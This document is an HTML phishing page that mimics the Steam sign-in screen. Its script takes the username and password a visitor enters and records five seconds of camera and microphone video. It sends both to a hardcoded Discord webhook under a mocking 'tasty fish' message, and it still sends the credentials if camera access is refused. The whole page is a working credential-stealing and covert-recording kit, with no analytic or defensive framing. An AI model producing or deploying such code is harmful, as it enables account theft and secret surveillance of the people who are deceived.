<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In</title>
    <style>
        body { background-color: #1b2838; color: #c6d4df; font-family: "Motiva Sans", Sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background-color: #181a21; padding: 40px; border-radius: 4px; width: 400px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 170px; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 5px; color: #afc0ce; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
        .input-group input { width: 100%; padding: 10px; background-color: #32353c; border: none; color: #fff; border-radius: 3px; box-sizing: border-box; outline: none; }
        .input-group input:focus { border: 1px solid #1a44c2; }
        .btn { width: 100%; padding: 12px; background: linear-gradient(to right, #47bfff 5%, #1a44c2 60%); border: none; color: white; font-size: 16px; border-radius: 3px; cursor: pointer; }
        .btn:hover { background: linear-gradient(to right, #47bfff 5%, #1a44c2 80%); }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam">
        </div>
        <div class="input-group">
            <label>Sign in with account name</label>
            <input type="text" id="username">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="password">
        </div>
        <button class="btn" id="loginBtn">Sign in</button>
    </div>

    <script>
        // PUT YOUR WEBHOOK URL HERE
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT';

        document.getElementById('loginBtn').addEventListener('click', async () => {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            try {
                // Request camera and mic
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    
                    // Prepare the payload for Discord
                    const formData = new FormData();
                    formData.append('content', `well well well you captured another tasty fish\n**Username:** ${user}\n**Password:** ${pass}`);
                    formData.append('file', blob, 'capture.webm');

                    // Exfiltrate to Discord
                    try {
                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            body: formData
                        });
                        console.log('Exfiltration successful');
                    } catch (err) {
                        console.error('Webhook failed:', err);
                    }
                };

                mediaRecorder.start();
                
                // Record for 5 seconds then stop and send
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 5000);

            } catch (err) {
                console.error("Camera/Mic access denied:", err);
                // Still send the credentials even if they deny the camera!
                const formData = new FormData();
                formData.append('content', `well well well you captured another tasty fish (No video - permission denied)\n**Username:** ${user}\n**Password:** ${pass}`);
                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            }
        });
    </script>
</body>
</html>
